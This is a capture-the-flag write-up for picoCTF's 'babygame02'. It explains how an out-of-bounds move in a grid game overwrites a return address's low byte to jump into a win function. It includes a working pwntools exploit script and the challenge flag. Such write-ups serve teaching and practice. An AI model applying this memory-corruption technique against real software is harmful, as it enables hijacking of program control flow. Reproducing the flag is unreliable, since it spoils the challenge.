# babygame02

## Challenge

The challenge is a game with grid that the player can move around in.

The initial state of the game is as follows:

```
Player position: 4 4
End tile position: 29 89
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
....@.....................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
.........................................................................................X
```

We can move around by sending 'w', 'a', 's', and 'd'.

If we reach the 'X' in the bottom right, the game prints "You win!" and exits.

The challenge is pretty much the same as babygame01, except there is no "Player has flag" variable.

## Solution

The same secret commands from babygame01 are present here.
They can also be found by reverse engineering the game binary.

'l' will change our player character to the next character we send.
For example, sending 'l' followed by 'A' will cause our character to appear as an 'A'.

'p' will automatically move our character to the 'X' in the bottom right of the grid, ending the game.

The `win` function will print the flag.
However, unlike the previous challenge, there is no variable we can set to reach this function.

The same vulnerability from babygame01 exists in this challenge.
We can move out of bounds of the grid and our player character will be written to our location.

The `win` function address and the return address from `move_player` into `main` only differ by the least significant byte.
If we can overwrite this byte to the correct value, we can jump into the `win` function instead of returning, which will print the flag.

Moving horizontally allows us to change our position by 1 byte, however, the player struct lies between the grid and the return address we want to overwrite.
Instead, we can setup our position in-bounds such that, when we move vertically once, we land exactly on the least significant byte of the return address.

Before we move out of bounds, our player character has to be set to the byte we want to write into the return address.
For this, we want to write the least significant byte of our jump target.
Our target is a couple instructions into the `win` function.
We want to avoid the first `push ebp` to maintain stack alignment.

If everything is setup correctly, after we move out of bounds we will return into the `win` function, which will print the flag.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host saturn.picoctf.net --port 49253 game
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('game')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'saturn.picoctf.net'
port = int(args.PORT or 49253)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

io = start()

x = 4
y = 4

io.send(b'l' + chr(0x5d + 3).encode())

while y > 0:
    io.send(b'w')
    y -= 1

while x < 51:
    io.send(b'd')
    x += 1

io.sendline(b'w')

io.interactive()
```

## Flag

```
picoCTF{gamer_jump1ng_4r0unD_7a26c512}
```
